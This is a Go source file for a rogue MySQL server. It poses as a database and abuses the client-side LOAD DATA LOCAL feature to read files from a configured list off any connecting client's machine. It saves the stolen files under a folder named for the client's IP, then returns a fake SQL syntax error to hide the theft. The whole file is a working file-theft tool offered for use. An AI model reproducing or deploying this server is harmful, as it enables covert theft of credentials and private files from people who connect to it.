package main

import (
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"github.com/prometheus/common/log"
	"gopkg.in/yaml.v2"
	"io/ioutil"
	"os"
	"path/filepath"
	"rogue_mysql_server/mysql"
	"strings"
	"sync"
	"time"
	"vitess.io/vitess/go/sqltypes"
)

type DB struct {
	listener *mysql.Listener
	Handler  mysql.Handler

	mapLock   sync.Mutex
	fileIndex map[uint32]int
	config    Config
}

type Config struct {
	Host          string              `yaml:"host"`
	Port          string              `yaml:"port"`
	FileList      []string            `yaml:"file_list"`
	SavePath      string              `yaml:"save_path"`
	Auth          bool                `yaml:"auth"`
	Users         []map[string]string `yaml:"users"`
	AlwaysRead    bool                `yaml:"always_read"`
	VersionString string              `yaml:"version_string"`
}

func NativePassword(password string) string {
	if len(password) == 0 {
		return ""
	}

	hash := sha1.New()
	hash.Write([]byte(password))
	s1 := hash.Sum(nil)

	hash.Reset()
	hash.Write(s1)
	s2 := hash.Sum(nil)

	s := strings.ToUpper(hex.EncodeToString(s2))

	return fmt.Sprintf("*%s", s)
}

func main() {
	config := Config{}
	cwd, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	configData, err := ioutil.ReadFile(fmt.Sprintf("%s/%s", cwd, "config.yaml"))

	if err != nil {
		log.Errorf("Config read error: %s", err)
		os.Exit(-1)
	}
	err = yaml.Unmarshal(configData, &config)

	if err != nil {
		log.Errorf("Config parse error: %s", err)
		os.Exit(-1)
	}

	db := &DB{}
	db.fileIndex = make(map[uint32]int)
	db.Handler = db
	db.config = config

	var authServer mysql.AuthServer
	if config.Auth {
		authServerStatic := mysql.NewAuthServerStatic()

		for _, user := range config.Users {
			for username, password := range user {
				password = NativePassword(password)

				if authServerStatic.Entries[username] == nil {
					authServerStatic.Entries[username] = []*mysql.AuthServerStaticEntry{
						{
							MysqlNativePassword: password,
							Password:            password,
						},
					}
				} else {
					authServerStatic.Entries[username] = append(authServerStatic.Entries[username], &mysql.AuthServerStaticEntry{
						MysqlNativePassword: password,
						Password:            password,
					})
				}
			}
		}

		authServer = authServerStatic
	} else {
		authServer = &mysql.AuthServerNone{}
	}

	db.listener, err = mysql.NewListener("tcp", fmt.Sprintf("%s:%s", config.Host, config.Port), authServer, db, config.VersionString, 0, 0)
	if err != nil {
		log.Errorf("NewListener failed: %s", err)
		os.Exit(-1)
	}

	log.Infof("Server started at [%s:%s]", config.Host, config.Port)
	db.listener.Accept()
}

//
// mysql.Handler interface
//

// NewConnection is part of the mysql.Handler interface.
func (db *DB) NewConnection(c *mysql.Conn) {
	log.Infof("New client from addr [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)

	if c.ConnAttrs != nil {
		log.Info("==== ATTRS ====")
		for name, value := range c.ConnAttrs {
			log.Infof("[%s]: [%s]", name, value)
		}
		log.Info("===============")
	}

	db.mapLock.Lock()
	db.fileIndex[c.ConnectionID] = 0
	db.mapLock.Unlock()
}

// ConnectionClosed is part of the mysql.Handler interface.
func (db *DB) ConnectionClosed(c *mysql.Conn) {
	log.Infof("Client leaved, Addr [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
	db.mapLock.Lock()
	delete(db.fileIndex, c.ConnectionID)
	db.mapLock.Unlock()
}

// ComQuery is part of the mysql.Handler interface.
func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Result) error) error {
	log.Infof("Client from addr [%s], ID [%d] try to query [%s]", c.RemoteAddr(), c.ConnectionID, query)

	if !c.SupportLoadDataLocal && !db.config.AlwaysRead { // 客户端不支持读取本地文件且没有开启总是读取，直接返回错误
		log.Info("Client not support LOAD DATA LOCAL, return error directly")
		c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
		return nil
	}

	length := len(db.config.FileList)
	if length == 0 {
		return nil
	} else {
		filename := db.config.FileList[db.fileIndex[c.ConnectionID]]
		db.mapLock.Lock()
		db.fileIndex[c.ConnectionID] = (db.fileIndex[c.ConnectionID] + 1) % length
		db.mapLock.Unlock()
		data := c.RequestFile(filename)
		log.Infof("Now try to read file [%s] from addr [%s], ID [%d]", filename, c.RemoteAddr(), c.ConnectionID)

		if data == nil || len(data) == 0 {
			log.Infof("Read failed, file may not exist in client")
		} else {
			path := fmt.Sprintf("%s/%s", db.config.SavePath, strings.Split(c.RemoteAddr().String(), ":")[0])

			if _, err := os.Stat(path); os.IsNotExist(err) {
				os.MkdirAll(path, 0755)
			}

			filename := strings.Split(filename, "/")
			filename = filename[len(filename)-1:]

			path = fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), filename[0])
			ioutil.WriteFile(path, data, 0644)
			log.Infof("Read success, stored at [%s]", path)
		}

		c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
		return nil
	}
}

// WarningCount is part of the mysql.Handler interface.
func (db *DB) WarningCount(c *mysql.Conn) uint16 {
	return 0
}
